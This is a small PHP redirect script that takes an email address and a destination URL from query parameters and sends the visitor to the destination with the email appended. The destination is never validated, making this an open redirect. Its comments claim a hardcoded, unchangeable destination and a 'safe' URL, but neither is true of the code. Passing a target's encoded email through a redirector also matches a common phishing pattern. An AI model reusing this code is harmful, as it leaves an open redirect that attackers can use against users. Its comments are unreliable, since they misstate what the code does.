<?php
// Redirect logic in PHP
if ($_SERVER['REQUEST_METHOD'] === 'GET') {
    // Get URL parameters
    $encodedEmail = isset($_GET['email']) ? $_GET['email'] : null; // Base64 encoded email
    $destination = isset($_GET['destination']) ? $_GET['destination'] : null; // Destination URL
    $base64Image = isset($_GET['image_data']) ? $_GET['image_data'] : null; // Base64 encoded image data (if needed)
    $randomString = isset($_GET['random']) ? $_GET['random'] : null; // Random string (if needed)
    $additionalData = isset($_GET['data1']) ? $_GET['data1'] : null; // Additional data (if needed)
    $timestamp = isset($_GET['timestamp']) ? $_GET['timestamp'] : null; // Timestamp (if needed)
    $token = isset($_GET['token']) ? $_GET['token'] : null; // Token (if needed)
    $uuid = isset($_GET['uuid']) ? $_GET['uuid'] : null; // UUID (if needed)
    $metadata = isset($_GET['metadata']) ? $_GET['metadata'] : null; // Metadata (if needed)

    // Validate required parameters
    if (!$encodedEmail || !$destination) {
        echo '<script>alert("Missing required parameters.");</script>';
        exit;
    }

    // Hardcoded destination URL inside the script (cannot be changed by the URL parameters)
    $fixedDestinationUrl = "https://twitter.com/home";

    // Decode the destination URL (to handle encoding)
    $safeDestinationUrl = urldecode($destination);

    // Construct the final redirect URL by appending the email directly to the path of the destination URL
    $redirectUrl = $safeDestinationUrl . $encodedEmail;

    // Debugging output for testing (uncomment for debugging purposes)
    // echo "Redirecting to: " . htmlspecialchars($redirectUrl);

    // Perform the redirection
    header("Location: $redirectUrl");
    exit;
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirect</title>
</head>
<body>
    <p>Redirecting...</p>
</body>
</html>
